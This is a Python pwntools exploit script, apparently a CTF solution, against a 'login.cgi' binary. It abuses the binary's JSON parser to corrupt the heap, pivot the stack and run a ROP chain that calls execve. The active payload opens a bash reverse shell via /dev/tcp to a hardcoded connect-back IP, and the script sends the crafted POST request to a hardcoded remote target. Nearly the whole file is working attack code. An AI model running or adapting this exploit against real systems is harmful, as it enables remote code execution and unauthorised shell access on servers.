from pwn import *

elf = context.binary = ELF("login-patched.cgi")
libc = ELF("libc.so.6")

TARGET_IP = "47.88.19.153"
TARGET_PORT = 31134
CONNECT_BACK_IP = "13.56.217.111"	# what the reverse shell will try to connect to. (probably ngrok ip)
CONNECT_BACK_PORT = 16321

# the command that we will execute on the target:

# command = [b"/bin/cat\0",
# 		   b"flag.txt\0"]

command = [b"/bin/bash\0",
		   b"-c\0",
		   b"/bin/bash -i >& /dev/tcp/%s/%s 0>&1\0" % (CONNECT_BACK_IP.encode(), str(CONNECT_BACK_PORT).encode())]

# ROP gadgets for stack pivoting:
# 0x00000000004111d1 : mov rsi, qword ptr [rax + 0x10] ; call qword ptr [rax + 8]
# 0x0000000000426eda : and ah, byte ptr [rdi - 1] ; jmp qword ptr [rsi - 0x70]
# 0x0000000000452b16 : push rsi ; idiv bh ; jmp qword ptr [rsi + 0xf]
# 0x0000000000404cb1 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

# ROP gadgets for the main ROP chain:
# 0x0000000000404cb7 : pop rdi ; ret
# 0x0000000000450ab0 : mov rax, qword ptr [rdi + 0x28] ; ret
# 0x0000000000406862 : pop rsi ; ret
# 0x00000000004165af : add rax, rsi ; ret
# 0x000000000040118d : call rax

# constructing the ROP chain:

# where the command strings will be written to in the ROP chain
command_addr = 0x6761a8

# stack pivoting
rop_chain = p64(0x00000000004111d1)		# mov rsi, qword ptr [rax + 0x10] ; call qword ptr [rax + 8]
rop_chain += p64(0x0000000000426eda)	# and ah, byte ptr [rdi - 1] ; jmp qword ptr [rsi - 0x70]
rop_chain += p64(0x676138)				# the address of 0x70 bytes after the next qword (for the jmp to [rsi - 0x70])
rop_chain += p64(0x0000000000452b16)	# @ 0x6760c8 => push rsi ; idiv bh ; jmp qword ptr [rsi + 0xf]
rop_chain += b"\0" * 0x68				# fill the distance with 0 so we will `and` a null-byte with `ah` and zero it out.
rop_chain += b"X" * 0xf + p64(0x0000000000404cb1) + b"W"	# pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

# main ROP chain
rop_chain += p64(0x0000000000404cb7)	# @ 0x676150 => pop rdi ; ret
rop_chain += p64(elf.got["puts"] - 0x28)
rop_chain += p64(0x0000000000450ab0)	# mov rax, qword ptr [rdi + 0x28] ; ret
rop_chain += p64(0x0000000000406862)	# pop rsi ; ret
rop_chain += p64(libc.sym["execve"] - libc.sym["puts"])
rop_chain += p64(0x00000000004165af)	# add rax, rsi ; ret
rop_chain += p64(0x0000000000404cb7)	# pop rdi ; ret
rop_chain += p64(command_addr)
rop_chain += p64(0x0000000000406862)	# pop rsi ; ret
rop_chain += p64(command_addr + sum(len(c) for c in command))
rop_chain += p64(0x000000000040118d)	# call rax

# prepare the command strings and the argv array
rop_chain += b"".join(command)			# @ 0x6761a8
for i in range(len(command)):
	rop_chain += p64(command_addr + sum(len(c) for c in command[:i]))	# write the argv array
rop_chain += p64(0)	# end argv with a NULL

assert(b'"' not in rop_chain)	# quotes will mess up the json formatting so we should tweak `command` to avoid them
rop_chain = rop_chain.replace(b"\0", b"\\u0000")
# rop_chain = p32(0xdeadbeef)	# for debugging to see if the heap attack and arbitrary write work

# heap attack:

write_top_1_size = b'\\u"\0' + b"A" * 25 + b"\x41\\u0000"
write_top_2_size = b'A' * 0x20 + b'\\u\0\0\0\0' + b'C' * 7 + b"\x61\\u0000"

data_string = 0x45534c	# the string "data\0" in elf memory
# we must use \\u0000 instead of nulls to not terminate the string,
# and the json parser itself will convert those to null-bytes:
data_string_packed = p64(data_string).rstrip(b"\0") + b"\\u0000" * 5
fd = b"\x7a\x60\x67" + b"\\u0000" * 5	# address of a suitable fake fastbin with proper chunk metadata in the data section
fake_json_struct = b"\\u0000" * 24 + b"\x04" + b"\\u0000" * 7 + data_string_packed + b"\\u0000" * 16 + data_string_packed
# we need to be careful not to corrupt the json object struct in the way of our overflow
fill_first_heap = b"E" * 0x20eaf + fake_json_struct + b"E" * 120
reallocate_top_1 = b"\\u\0\0\0\0" + fill_first_heap + b"\x41" + b"\\u0000" * 7 + fd
reallocate_top_2 = b"F" * 0x30

write_in_bss = b"\\u0000" * 10 + b"\\u\0\0\0\0" + b"\\u0000" * 23 + b"\x01" + b"\\u0000" * 3 + rop_chain

# constructing heap attack payload. this part is explained in `README.md`
payload = b'{"timestamp": 1050000'
payload += b', "data": "%s"' % write_top_1_size
payload += b', "data\\u0000%s": "%s"' % (b"A" * 0x20, write_top_2_size)
payload += b', "data\\u0000%s": "%s"' % (b"A" * 0x80, reallocate_top_1)
payload += b', "data\\u0000%s": "%s"' % (b"A" * 0x80, reallocate_top_2)
payload += b', "data\\u0000%s": "%s"' % (b"A" * 0x80, write_in_bss)
payload = payload.ljust(0x20000, b" ")
payload += b'}'

# sending the payload to the target
REQUEST_METHOD = "POST"	# using POST so that we can pass null-bytes in our request
CONTENT_LENGTH = str(len(payload))

env={"REQUEST_METHOD": REQUEST_METHOD,
	"CONTENT_LENGTH": CONTENT_LENGTH}

if args.REMOTE:
	p = remote(TARGET_IP, TARGET_PORT)
	http_request = b"POST /cgi-bin/login.cgi HTTP/1.1\r\n"
	http_request += b"Host: %s:%s\r\n" % (TARGET_IP.encode(), str(TARGET_PORT).encode())
	http_request += b"Content-Length: " + CONTENT_LENGTH.encode() + b"\r\n"
	http_request += b"\r\n" + payload + b"\r\n\r\n"
	p.send(http_request)
	res = p.recv(1000)
	print(res.replace(b"\r", b"").decode())
else:
	p = elf.process(env=env)
	if args.GDB:
		gdb.attach(p, gdbscript="b *0x401b18\nset max-visualize-chunk-size 0x500")
		pause()
	p.send(payload)
	p.interactive()
